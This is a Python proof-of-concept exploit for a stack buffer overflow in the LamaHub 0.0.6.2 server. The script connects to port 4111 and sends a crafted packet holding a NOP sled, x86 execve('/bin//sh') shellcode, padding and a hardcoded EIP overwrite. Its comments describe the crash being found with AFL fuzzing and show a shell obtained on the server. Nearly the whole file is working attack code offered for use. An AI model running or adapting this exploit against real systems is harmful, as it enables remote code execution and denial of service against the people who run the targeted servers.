# Exploit Title: LamaHub-0.0.6.2 BufferOverflow
# Date: 09/09/09
# Exploit Author: Pi3rrot
# Vendor Homepage: http://lamahub.sourceforge.net/
# Software Link: http://ovh.dl.sourceforge.net/sourceforge/lamahub/LamaHub-0.0.6.2.tar.gz
# Version: 0.0.6.2
# Tested on: Debian 8 32bits

# This exploit may crash the Lamahub service in many cases.
# If you compile with -fno-stack-protection and -z execstack
# you will be able to execute arbitrary code.
#
# Thanks to the AFL dev' for making the fuzzer who find the crash ;)
# Thanks to gapz for AFL configuration.
#
# pierre@pi3rrot.net


# How it works ?
# Client side:
# exploit_writeEIP.py

# Server side:
# ➜ ./server
# > init () -> OK
# > started on port -> 4111
# > new client -> 127.0.0.1 -> 4
# $ whoami
# pierre
# $


import socket

HOST = 'localhost'
PORT = 4111
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

buf = ""
buf += "\x24\x53\x75\x70\x70\x6f\x72\x74\x73\x20\x55\x73"
buf += "\x6c\x6c\x6f\x20\x49\x50\x32\x20\x65\x61\x72\x63"
buf += "\x68\x20\x5a\x50\x65\x30\x20\x7c\x24\x4b\x65\x79"
buf += "\x61\x7c\x24\x56\x61\x6c\x69\x64\x61\x74\x65\x4e"
buf += "\x69\x63\x6b\x20\x50\x69\x65\x72\x72\x65\x7c\x24"
buf += "\x56\x65\x6e\x20\x31\x2c\x30\x30\x39\x31\x7c\x24"
buf += "\x47\x01\x00\x4e\x3b\x63\x6b\x4c\x69\x73\x74\x7c"
buf += "\x24\x4d\x79\x49\x4e\x46\x4f\x20\x24\x41\x4c\x4c"
buf += "\x20\x50\x69\x65\x72\x72\x65\x20\x4a\x65"

#NEED padding of 96
shellcode = "\x90" *30
shellcode += "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80"
shellcode += "\x90"*42
print "Shellcode len: "
print len(shellcode)

buf2 = "\x61\x3c"
buf2 += "\x3c\x24\x4d\x79\x80\x00\x35\x24\x70\x69\x24\x30"
buf2 += "\x24\x37\x37\x37\x37\x37\x37\x37\x37\x37\x37\x37"
buf2 += "\x37\xb1\xb1\xb1\xb1\xb1\xb1\xb1\xb1\xb1\xb1\xb1"
buf2 += "\xb1\xb1\xb1\xb1\xb1\xb1\xb1\xb1\xb1\xb1\xb1\xb1"
buf2 += "\xb1\xb1\xb1\xb1\xb1\xb1\xb1\xb1\xb1\xb1\xb1\xb1"
buf2 += "\xb1\xb1\xb1\xb1\xb1\xb1\xb1\xb1\xb1\xb1\xb1\xb1"
buf2 += "\xb1\x2c\x2c\x2c\x2c\x2c\x2c\x2c\x2c\x2c\x2c\x2c"
buf2 += "\x2c\x2c\x2c\x2c\x2c\x2c\x2c\x2c\x2c\x2c\x2c\x2c"
buf2 += "\x2c\x2c\x2c\x2c\x2c\x2c\x2c\x2c\x2c\x2c\x2c\x2c"
buf2 += "\x2c\x2c\x2c\x2c\x2c\x2c\x2c\x2c\x2c\x2c\x2c\x2c"
buf2 += "\x2c\x2c\x2c\x2c\x2c\x2c\x2c\x2c\x2c\x2c\x2c\x2c"
buf2 += "\x2c\x2c\x2c\x2c\x2c\x2c\x2c\x2c\x2c\x2c\x2c\x2c"
buf2 += "\x2c\x2c\x2c\x2c\x2c\x2c\x2c\x2c\x2c\x2c\x2c\x2c"
buf2 += "\x2c\x2c\x2c\x2c\x2c\x2c\x2c\x2c"

eip_overwrite = "\x2a\x6a\x06\x08"
#eip_overwrite = "AAAA"
buf3 = "\xd6\x26\x06\x08\xb1\xb1\xb1\xb1\xb1\xb1\xb1\xb1"
buf3 += "\xb1\xb1\xb1\xb1\x37\x37\x30\x2c\x49\x4e\x46\x4f"
buf3 += "\x24\xca\xca\xca\xca\x20\x5a\x50\x65\x30\x20\x7c"
buf3 += "\x24\x4b\x65\x79\x61\x7c\x24\x56\x20\x41\x20\x30"
buf3 += "\x61\x7c\x24\x56\x69\x63\x6b\x20\x50\x69\xca\xca"
buf3 += "\x0a"

# Send EVIL PACKET !
s.sendall(buf + shellcode + buf2 + eip_overwrite + buf3)
s.close()